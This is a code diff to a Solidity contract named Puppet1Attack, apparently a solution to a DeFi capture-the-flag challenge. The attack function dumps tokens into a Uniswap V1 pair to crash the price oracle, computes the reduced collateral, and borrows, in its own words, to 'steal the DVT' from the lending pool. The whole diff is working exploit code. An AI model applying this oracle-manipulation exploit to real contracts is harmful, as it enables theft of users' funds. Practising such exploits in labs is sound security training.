@@ -82,14 +82,25 @@ contract Puppet1Attack {
         uniswapPairAddress = _uniswapPairAddress;
         puppetPool = _puppetPool;
         player = _player;
-        dvtToken.transferFrom(player, address(this), dvtAmount);
     }
 
-    function attack() public{
+    function attack() public payable{
         console.log("uniswapPairAddress", uniswapPairAddress);
+        dvtToken.approve(uniswapPairAddress, 1000 ether);
+
         IUniswapExchangeV1(uniswapPairAddress).tokenToEthTransferInput(dvtAmount, 9 ether, block.timestamp + 1, address(this));
         console.log("address(this).balance", address(this).balance); 
 
+        // Calculate required collateral
+        uint256 price = uniswapPairAddress.balance * (10 ** 18) / dvtToken.balanceOf(uniswapPairAddress);
+        uint256 depositRequired = (100000 ether) * price * 2 / 10 ** 18;
+
+        console.log("contract ETH balance: ", address(this).balance);
+        console.log("DVT price: ", price);
+        console.log("Deposit Required: ", depositRequired);
+
+        // Borrow and steal the DVT
+        puppetPool.borrow{value: depositRequired}(100000 ether, player);
     }
 
     
